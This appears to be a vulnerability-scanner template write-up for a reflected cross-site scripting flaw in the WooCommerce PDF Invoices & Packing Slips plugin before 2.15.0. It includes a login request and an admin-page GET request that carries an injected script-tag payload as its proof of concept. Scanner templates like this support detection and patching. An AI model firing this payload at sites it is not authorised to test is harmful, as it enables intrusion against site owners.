# Nuclei Template: WordPress WooCommerce PDF Invoices & Packing Slips <2.15.0 - Cross-Site Scripting
**Template ID:** woocommerce-pdf-invoices-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`woocommerce-pdf-invoices-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress WooCommerce PDF Invoices & Packing Slips 2.15.0 does not escape some URLs before outputting them in attributes, leading to reflected cross-site scripting.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/admin.php?page=wpo_wcpdf_options_page&tab=documents&section=invoice&"><script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}
```

## References
- https://wpscan.com/vulnerability/bc05dde0-98a2-46e3-b2c8-7bdc8c32394b
- https://wordpress.org/plugins/woocommerce-pdf-invoices-packing-slips/
